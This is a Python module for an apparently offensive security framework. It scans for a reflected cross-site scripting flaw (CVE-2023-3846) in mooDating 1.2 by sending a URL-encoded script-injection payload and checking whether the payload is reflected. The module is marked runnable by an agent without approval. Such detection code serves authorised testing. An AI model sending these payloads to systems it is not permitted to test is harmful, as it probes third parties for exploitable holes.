#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability classified as problematic has been found in mooSocial mooDating 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MooDating 1.2 - Cross-Site Scripting Detection',
        'description': 'A vulnerability classified as problematic has been found in mooSocial mooDating 1.2. This affects an unknown part of the file /pages of the component URL Handler. The manipulation leads to cross site scripting. It is possible to initiate the attack remotely.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'packetstorm', 'xss', 'moodating', 'moosocial', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/173691/mooDating-1.2-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-3846',
            'https://vuldb.com/?ctiid.235197',
            'https://vuldb.com/?id.235197',
        ],
        'cve': 'CVE-2023-3846',
    }

    def run(self):
        r = self.http_request(method="GET", path='/pagesi3efi%22%3e%3cimg%20src%3da%20onerror%3dalert(document.domain)%3ebdk84/no-permission-role?access_token&=redirect_url=aHR0cHM6Ly9kZW1vLm1vb2RhdGluZ3NjcmlwdC5jb20vbWVldF9tZS9pbmRleC9tZWV0X21l', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('><img src=a onerror=alert(document.domain)>', 'mooDating',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="MooDating 1.2 - Cross-Site Scripting detected",
                path='/pagesi3efi%22%3e%3cimg%20src%3da%20onerror%3dalert(document.domain)%3ebdk84/no-permission-role?access_token&=redirect_url=aHR0cHM6Ly9kZW1vLm1vb2RhdGluZ3NjcmlwdC5jb20vbWVldF9tZS9pbmRleC9tZWV0X21l',
            )
            return True
        return False

